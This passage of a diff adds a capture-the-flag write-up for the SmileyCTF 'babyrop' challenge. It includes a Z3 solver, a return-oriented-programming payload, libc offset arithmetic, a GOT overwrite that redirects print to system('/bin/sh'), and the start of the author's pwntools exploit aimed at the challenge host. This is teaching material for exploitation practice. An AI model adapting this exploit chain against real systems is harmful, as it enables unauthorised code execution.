+</span><span>        </span><span style="color:#bf616a;">add_al_to_rl</span><span>(eax_for_verification, rcx) </span><span style="color:#65737e;"># Pass the same eax_for_verification
+</span><span>        
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">Final memory[</span><span>{</span><span style="color:#96b5b4;">hex</span><span>(rcx)}</span><span style="color:#a3be8c;">] RL: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(memory[rcx] &amp; </span><span style="color:#d08770;">0xFF</span><span>)}&quot;)
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(memory[rcx] &amp; </span><span style="color:#d08770;">0xFF</span><span>) == target_rl:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Verification successful: RL changed to 0x2b! 🎉</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Verification failed. 🐞</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># Print the execution count
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">--- Function Execution Summary ---</span><span>&quot;)
+</span><span>    add_eax_2ec3_count = executed_functions.</span><span style="color:#bf616a;">count</span><span>(&quot;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&quot;)
+</span><span>    add_al_to_rl_count = executed_functions.</span><span style="color:#bf616a;">count</span><span>(&quot;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Executed &#39;add_eax_2ec3&#39;: </span><span>{add_eax_2ec3_count}</span><span style="color:#a3be8c;"> time(s)</span><span>&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Executed &#39;add_al_to_rl&#39;: </span><span>{add_al_to_rl_count}</span><span style="color:#a3be8c;"> time(s)</span><span>&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Execution order: </span><span>{executed_functions}&quot;)
+</span><span>
+</span><span style="color:#b48ead;">else</span><span>:
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Z3 could not find a solution.</span><span>&quot;)
+</span></code></pre>
+<p>The calculations like this,</p>
+<p>Current 0x404010 -&gt; 0x7ffff7e32be0
+Target   0x404010 -&gt; 0x7ffff7e2ee21</p>
+<p>For example,</p>
+<blockquote>
+<p>eax start value 0, Finds how many times add_eax_0x2ec3 and add_al_to_rl operation should've must for setting specific byte 0x2b to 0xee with order.</p>
+</blockquote>
+<p>Here is the first calculation result.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@f12e4e68815a:/host#</span><span> python3 solver2.py 
+</span><span style="color:#bf616a;">Z3</span><span> found an OPTIMIZED solution:
+</span><span>  </span><span style="color:#bf616a;">Minimum </span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39; calls before loop: 1
+</span><span>  </span><span style="color:#bf616a;">Minimum </span><span>&#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39; calls: 1
+</span><span>  </span><span style="color:#bf616a;">eax</span><span> value when add_al_to_rl loop starts: 0x2ec3
+</span><span>  </span><span style="color:#bf616a;">AL</span><span> used during loop: 0xc3
+</span><span>
+</span><span style="color:#bf616a;">---</span><span> Verification and Execution Count ---
+</span><span style="color:#bf616a;">Initial</span><span> eax: 0x0
+</span><span style="color:#bf616a;">Initial</span><span> memory</span><span style="color:#b48ead;">[</span><span>0x404010</span><span style="color:#b48ead;">]</span><span> RL: 0x2b
+</span><span style="color:#bf616a;">eax</span><span> after 1 &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39; calls: 0x2ec3
+</span><span style="color:#bf616a;">AL</span><span> from this eax: 0xc3
+</span><span>
+</span><span style="color:#bf616a;">Final</span><span> memory</span><span style="color:#b48ead;">[</span><span>0x404010</span><span style="color:#b48ead;">]</span><span> RL: 0xee
+</span><span style="color:#bf616a;">Verification</span><span> successful: RL changed to 0x2b! 🎉
+</span><span>
+</span><span style="color:#bf616a;">---</span><span> Function Execution Summary ---
+</span><span style="color:#bf616a;">Executed </span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;: 1 time(s)
+</span><span style="color:#bf616a;">Executed </span><span>&#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;: 1 time(s)
+</span><span style="color:#bf616a;">Execution</span><span> order: </span><span style="color:#b48ead;">[</span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;</span><span style="color:#b48ead;">]
+</span></code></pre>
+<p>After that updating the values inside of script and than re-execute. I'm lazy i know.
+The calculations of 0xe0 to 0x21.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@f12e4e68815a:/host#</span><span> python3 solver2.py 
+</span><span style="color:#bf616a;">Z3</span><span> found an OPTIMIZED solution:
+</span><span>  </span><span style="color:#bf616a;">Minimum </span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39; calls before loop: 18
+</span><span>  </span><span style="color:#bf616a;">Minimum </span><span>&#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39; calls: 9
+</span><span>  </span><span style="color:#bf616a;">eax</span><span> value when add_al_to_rl loop starts: 0x34a79
+</span><span>  </span><span style="color:#bf616a;">AL</span><span> used during loop: 0x79
+</span><span>
+</span><span style="color:#bf616a;">---</span><span> Verification and Execution Count ---
+</span><span style="color:#bf616a;">Initial</span><span> eax: 0xc3
+</span><span style="color:#bf616a;">Initial</span><span> memory</span><span style="color:#b48ead;">[</span><span>0x404010</span><span style="color:#b48ead;">]</span><span> RL: 0xe0
+</span><span style="color:#bf616a;">eax</span><span> after 18 &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39; calls: 0x34a79
+</span><span style="color:#bf616a;">AL</span><span> from this eax: 0x79
+</span><span>
+</span><span style="color:#bf616a;">Final</span><span> memory</span><span style="color:#b48ead;">[</span><span>0x404010</span><span style="color:#b48ead;">]</span><span> RL: 0x21
+</span><span style="color:#bf616a;">Verification</span><span> successful: RL changed to 0x2b! 🎉
+</span><span>
+</span><span style="color:#bf616a;">---</span><span> Function Execution Summary ---
+</span><span style="color:#bf616a;">Executed </span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;: 18 time(s)
+</span><span style="color:#bf616a;">Executed </span><span>&#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;: 9 time(s)
+</span><span style="color:#bf616a;">Execution</span><span> order: </span><span style="color:#b48ead;">[</span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;</span><span style="color:#b48ead;">]
+</span></code></pre>
+<p>And the last calculations.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@f12e4e68815a:/host#</span><span> python3 solver2.py 
+</span><span style="color:#bf616a;">Z3</span><span> found an OPTIMIZED solution:
+</span><span>  </span><span style="color:#bf616a;">Minimum </span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39; calls before loop: 2
+</span><span>  </span><span style="color:#bf616a;">Minimum </span><span>&#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39; calls: 1
+</span><span>  </span><span style="color:#bf616a;">eax</span><span> value when add_al_to_rl loop starts: 0x5dff
+</span><span>  </span><span style="color:#bf616a;">AL</span><span> used during loop: 0xff
+</span><span>
+</span><span style="color:#bf616a;">---</span><span> Verification and Execution Count ---
+</span><span style="color:#bf616a;">Initial</span><span> eax: 0x79
+</span><span style="color:#bf616a;">Initial</span><span> memory</span><span style="color:#b48ead;">[</span><span>0x404010</span><span style="color:#b48ead;">]</span><span> RL: 0xe3
+</span><span style="color:#bf616a;">eax</span><span> after 2 &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39; calls: 0x5dff
+</span><span style="color:#bf616a;">AL</span><span> from this eax: 0xff
+</span><span>
+</span><span style="color:#bf616a;">Final</span><span> memory</span><span style="color:#b48ead;">[</span><span>0x404010</span><span style="color:#b48ead;">]</span><span> RL: 0xe2
+</span><span style="color:#bf616a;">Verification</span><span> successful: RL changed to 0x2b! 🎉
+</span><span>
+</span><span style="color:#bf616a;">---</span><span> Function Execution Summary ---
+</span><span style="color:#bf616a;">Executed </span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;: 2 time(s)
+</span><span style="color:#bf616a;">Executed </span><span>&#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;: 1 time(s)
+</span><span style="color:#bf616a;">Execution</span><span> order: </span><span style="color:#b48ead;">[</span><span>&#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&#39;</span><span style="color:#b48ead;">]
+</span></code></pre>
+<p>After each calculations and chaining the gadgets. The result as expected.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/760ad4710464015017e90f8536db37a2.png" alt="760ad4710464015017e90f8536db37a2.png" /></p>
+<p>The chain inside PoC. I kept the variable names same with PoC creator.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#...
+</span><span>PUSH_RBP_MOV_RBP_RSP_poprcx = </span><span style="color:#d08770;">0x40117a
+</span><span>MOV_RBP_RSP_poprcx = </span><span style="color:#d08770;">0x40117b
+</span><span>ADD_EAX_0x2ec3_addrbp0x3debx = </span><span style="color:#d08770;">0x401157
+</span><span>ADD_RPBs0x3d_EBX = </span><span style="color:#d08770;">0x40115c
+</span><span style="color:#bf616a;">ADD_AH_DH </span><span>= </span><span style="color:#d08770;">0x4010b4
+</span><span style="color:#bf616a;">ADD_BL_DH </span><span>= </span><span style="color:#d08770;">0x4010bf
+</span><span style="color:#bf616a;">POP_RBP </span><span>= </span><span style="color:#d08770;">0x401181
+</span><span style="color:#bf616a;">ADD_RSP_8 </span><span>= </span><span style="color:#d08770;">0x401230
+</span><span style="color:#bf616a;">RET </span><span>= </span><span style="color:#d08770;">0x401234
+</span><span style="color:#bf616a;">POP_RCX </span><span>= </span><span style="color:#d08770;">0x40117e
+</span><span>ADD_BPRCX_AL_poprbp = </span><span style="color:#d08770;">0x40115b
+</span><span style="color:#bf616a;">MOV_EAX_0_LEAVE </span><span>= </span><span style="color:#d08770;">0x401221
+</span><span>
+</span><span style="color:#bf616a;">PRINT_CALL </span><span>= </span><span style="color:#d08770;">0x401211
+</span><span>
+</span><span style="color:#bf616a;">LIBC_POP_RBX </span><span>= </span><span style="color:#d08770;">0x83e21
+</span><span style="color:#bf616a;">SYSTEM </span><span>= </span><span style="color:#d08770;">0x58750
+</span><span>
+</span><span>writeable = </span><span style="color:#d08770;">0x404500
+</span><span>
+</span><span>rcxpyld  = </span><span style="color:#bf616a;">p64</span><span>(ADD_BPRCX_AL_poprbp)
+</span><span>rcxpyld += </span><span style="color:#bf616a;">p64</span><span>(writeable)
+</span><span>
+</span><span>payload = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x5151515151515151</span><span>)*</span><span style="color:#d08770;">5
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RCX</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x404011</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RBP</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(writeable)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(ADD_EAX_0x2ec3_addrbp0x3debx)*</span><span style="color:#d08770;">1
+</span><span>payload += rcxpyld*</span><span style="color:#d08770;">1
+</span><span>
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RCX</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x404010</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(ADD_EAX_0x2ec3_addrbp0x3debx)*</span><span style="color:#d08770;">18
+</span><span>payload += rcxpyld*</span><span style="color:#d08770;">9
+</span><span>
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RCX</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x404012</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(ADD_EAX_0x2ec3_addrbp0x3debx)*</span><span style="color:#d08770;">2
+</span><span>payload += rcxpyld*</span><span style="color:#d08770;">1
+</span><span>
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">PRINT_CALL</span><span>)
+</span><span>
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">total bytes of payload: </span><span>{</span><span style="color:#96b5b4;">len</span><span>(payload)}&quot;)
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span style="color:#65737e;">#...
+</span></code></pre>
+<h3 id="chain-chin-cho">Chain-Chin-Cho</h3>
+<p>So we have now ability to set <code>ebx</code> register anything we want. The plan is simple from this point.</p>
+<p>Getting offsets <code>__libc_system and libc_pop_ebx</code></p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>(remote) gef➤  p </span><span style="color:#d08770;">0x7ffff7e2ee21</span><span>-</span><span style="color:#d08770;">0x7ffff7dab000
+</span><span>$</span><span style="color:#d08770;">1 </span><span>= </span><span style="color:#d08770;">0x83e21
+</span><span>(remote) gef➤  p </span><span style="color:#d08770;">0x7ffff7e03750</span><span>-</span><span style="color:#d08770;">0x7ffff7dab000
+</span><span>$</span><span style="color:#d08770;">2 </span><span>= </span><span style="color:#d08770;">0x58750
+</span><span>(remote) gef➤  
+</span></code></pre>
+<blockquote>
+<p>The [[02- eth007 - babyrop Challange#^e2ee21-addr|0x0x7ffff7e2ee21]] first instruction <code>add rsp,0x18</code> The 2 null bytes for that.
+Set rbx difference between system and libc_pop_rbx
+Set rbp to 0x40404d</p>
+</blockquote>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">###...
+</span><span>        </span><span style="color:#bf616a;">PRINT_CALL</span><span>,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#bf616a;">SYSTEM</span><span>-</span><span style="color:#bf616a;">LIBC_POP_RBX</span><span>, </span><span style="color:#65737e;"># new rbx
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r12
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r13
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r14
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r15
+</span><span>        </span><span style="color:#d08770;">0x404010</span><span>+</span><span style="color:#d08770;">0x3d</span><span>, </span><span style="color:#65737e;"># new rbp
+</span><span style="color:#65737e;">###...
+</span></code></pre>
+<p>After set rbx and rbp values. Next phase updating the print GOT (0x404010) from 0x0x7ffff7e2ee21 to 0x7ffff7e03750.</p>
+<blockquote>
+<p>Re- Set rbx difference between system and libc_pop_rbx
+Re- Set rbp to 0x40404d
+Add ebx to RBP</p>
+</blockquote>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>        </span><span style="color:#bf616a;">PRINT_CALL</span><span>, </span><span style="color:#65737e;"># rerun for rax=r14=0
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#bf616a;">SYSTEM</span><span>-</span><span style="color:#bf616a;">LIBC_POP_RBX</span><span>, </span><span style="color:#65737e;"># new rbx
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r12
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r13
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r14
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r15
+</span><span>        </span><span style="color:#d08770;">0x404010</span><span>+</span><span style="color:#d08770;">0x3d</span><span>, </span><span style="color:#65737e;"># new rbp
+</span><span>        ADD_RPBs0x3d_EBX,
+</span></code></pre>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/0186a9a56b6c08d15a62f54996ccde77.png" alt="0186a9a56b6c08d15a62f54996ccde77.png" /></p>
+<p>The rest is simple. Preparing rbp-0x20 to <code>/bin/sh\0</code> and than call the <code>__libc_system</code> via print. Since we don't control over the rsi but the content of rsi doesn't bother the execution in this case.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>        </span><span style="color:#bf616a;">ADD_RSP_8</span><span>, </span><span style="color:#65737e;"># skip over /bin/sh
+</span><span>        </span><span style="color:#d08770;">0x0068732f6e69622f</span><span>, </span><span style="color:#65737e;"># /bin/sh\0
+</span><span>        </span><span style="color:#bf616a;">RET</span><span>,
+</span><span>        </span><span style="color:#bf616a;">RET</span><span>,
+</span><span>        MOV_RBP_RSP_poprcx,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#bf616a;">PRINT_CALL
+</span></code></pre>
+<p>The local execution.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/6d3b50e216927878136aeebe5c9b398e.png" alt="6d3b50e216927878136aeebe5c9b398e.png" /></p>
+<p>The remote execution.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/23739a6839bdc16b0b64b93c5b24c371.png" alt="23739a6839bdc16b0b64b93c5b24c371.png" /></p>
+<p>The author of this exploit comments about this exploit <code>mangling rax</code> which is make sense</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/5ee6285827f4a10addff8eae00581c5e.png" alt="5ee6285827f4a10addff8eae00581c5e.png" /></p>
+<p>It was fun and painfull to me, The last exploit i developed like 5 years or smt like that. So it was a good practice.</p>
+<p>The shared PoC code didn't work in my environment, i edited a bit in mine version. Here is the shared PoC code for this challange by the author.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python3
+</span><span style="color:#65737e;"># -*- coding: utf-8 -*-
+</span><span style="color:#65737e;"># This exploit template was generated via:
+</span><span style="color:#65737e;"># $ pwn template --host smiley.cat --port 46657
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.terminal = [&quot;</span><span style="color:#a3be8c;">kitten</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">@</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">launch</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">--type</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">tab</span><span>&quot;]
+</span><span>
+</span><span style="color:#65737e;"># Set up pwntools for the correct architecture
+</span><span>exe = context.binary = </span><span style="color:#bf616a;">ELF</span><span>(args.</span><span style="color:#bf616a;">EXE </span><span>or &#39;</span><span style="color:#a3be8c;">vuln</span><span>&#39;)
+</span><span>
+</span><span style="color:#65737e;"># Many built-in settings can be controlled on the command-line and show up
+</span><span style="color:#65737e;"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR
+</span><span style="color:#65737e;"># for all created processes...
+</span><span style="color:#65737e;"># ./exploit.py DEBUG NOASLR
+</span><span style="color:#65737e;"># ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
+</span><span>host = args.</span><span style="color:#bf616a;">HOST </span><span>or &#39;</span><span style="color:#a3be8c;">smiley.cat</span><span>&#39;
+</span><span>port = </span><span style="color:#bf616a;">int</span><span>(args.</span><span style="color:#bf616a;">PORT </span><span>or </span><span style="color:#d08770;">42447</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># Use the specified remote libc version unless explicitly told to use the
+</span><span style="color:#65737e;"># local system version with the `LOCAL_LIBC` argument.
+</span><span style="color:#65737e;"># ./exploit.py LOCAL LOCAL_LIBC
+</span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL_LIBC</span><span>:
+</span><span>    libc = exe.libc
+</span><span style="color:#b48ead;">elif </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>    library_path = libcdb.</span><span style="color:#bf616a;">download_libraries</span><span>(&#39;</span><span style="color:#a3be8c;">libc.so.6</span><span>&#39;)
+</span><span>    </span><span style="color:#b48ead;">if </span><span>library_path:
+</span><span>        exe = context.binary = ELF.</span><span style="color:#bf616a;">patch_custom_libraries</span><span>(exe.path, library_path)
+</span><span>        libc = exe.libc
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        libc = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">libc.so.6</span><span>&#39;)
+</span><span style="color:#b48ead;">else</span><span>:
+</span><span>    libc = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">libc.so.6</span><span>&#39;)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start_local</span><span>(</span><span style="color:#bf616a;">argv</span><span>=[], *</span><span style="color:#bf616a;">a</span><span>, **</span><span style="color:#bf616a;">kw</span><span>):
+</span><span>    </span><span style="color:#65737e;">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">GDB</span><span>:
+</span><span>        </span><span style="color:#b48ead;">return </span><span>gdb.</span><span style="color:#bf616a;">debug</span><span>([exe.path] + argv, </span><span style="color:#bf616a;">gdbscript</span><span>=gdbscript, *a, **kw)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">process</span><span>([exe.path] + argv, *a, **kw)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start_remote</span><span>(</span><span style="color:#bf616a;">argv</span><span>=[], *</span><span style="color:#bf616a;">a</span><span>, **</span><span style="color:#bf616a;">kw</span><span>):
+</span><span>    </span><span style="color:#65737e;">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+</span><span>    io = </span><span style="color:#bf616a;">connect</span><span>(host, port)
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">GDB</span><span>:
+</span><span>        gdb.</span><span style="color:#bf616a;">attach</span><span>(io, </span><span style="color:#bf616a;">gdbscript</span><span>=gdbscript)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start</span><span>(</span><span style="color:#bf616a;">argv</span><span>=[], *</span><span style="color:#bf616a;">a</span><span>, **</span><span style="color:#bf616a;">kw</span><span>):
+</span><span>    </span><span style="color:#65737e;">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">start_local</span><span>(argv, *a, **kw)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">start_remote</span><span>(argv, *a, **kw)
+</span><span>
+</span><span style="color:#65737e;"># Specify your GDB script here for debugging
+</span><span style="color:#65737e;"># GDB will be launched if the exploit is run via e.g.
+</span><span style="color:#65737e;"># ./exploit.py GDB
+</span><span>gdbscript = &#39;&#39;&#39;
+</span><span style="color:#a3be8c;">b main
+</span><span style="color:#a3be8c;">b *0x0000000000401211
+</span><span style="color:#a3be8c;">continue
+</span><span style="color:#a3be8c;">set $tsp=$rsp
+</span><span style="color:#a3be8c;">define tle
+</span><span style="color:#a3be8c;">tele $tsp
+</span><span style="color:#a3be8c;">end
+</span><span>&#39;&#39;&#39;.</span><span style="color:#bf616a;">format</span><span>(**</span><span style="color:#96b5b4;">locals</span><span>())
+</span><span>
+</span><span style="color:#65737e;">#===========================================================
+</span><span style="color:#65737e;">#                    EXPLOIT GOES HERE
+</span><span style="color:#65737e;">#===========================================================
+</span><span style="color:#65737e;"># Arch:     amd64-64-little
+</span><span style="color:#65737e;"># RELRO:      Full RELRO
+</span><span style="color:#65737e;"># Stack:      No canary found
+</span><span style="color:#65737e;"># NX:         NX enabled
+</span><span style="color:#65737e;"># PIE:        No PIE (0x400000)
+</span><span style="color:#65737e;"># SHSTK:      Enabled
+</span><span style="color:#65737e;"># IBT:        Enabled
+</span><span style="color:#65737e;"># Stripped:   No
+</span><span>
+</span><span>io = </span><span style="color:#bf616a;">start</span><span>()
+</span><span>
+</span><span>PUSH_RBP_MOV_RBP_RSP_poprcx = </span><span style="color:#d08770;">0x40117a
+</span><span>MOV_RBP_RSP_poprcx = </span><span style="color:#d08770;">0x40117b
+</span><span>ADD_EAX_0x2ec3_addrbp0x3debx = </span><span style="color:#d08770;">0x401157
+</span><span>ADD_RPBs0x3d_EBX = </span><span style="color:#d08770;">0x40115c
+</span><span style="color:#bf616a;">ADD_AH_DH </span><span>= </span><span style="color:#d08770;">0x4010b4
+</span><span style="color:#bf616a;">ADD_BL_DH </span><span>= </span><span style="color:#d08770;">0x4010bf
+</span><span style="color:#bf616a;">POP_RBP </span><span>= </span><span style="color:#d08770;">0x401181
+</span><span style="color:#bf616a;">ADD_RSP_8 </span><span>= </span><span style="color:#d08770;">0x401230
+</span><span style="color:#bf616a;">RET </span><span>= </span><span style="color:#d08770;">0x401234
+</span><span style="color:#bf616a;">POP_RCX </span><span>= </span><span style="color:#d08770;">0x40117e
+</span><span>ADD_BPRCX_AL_poprbp = </span><span style="color:#d08770;">0x40115b
+</span><span style="color:#bf616a;">MOV_EAX_0_LEAVE </span><span>= </span><span style="color:#d08770;">0x401221
+</span><span>
+</span><span style="color:#bf616a;">PRINT_CALL </span><span>= </span><span style="color:#d08770;">0x401211
+</span><span>
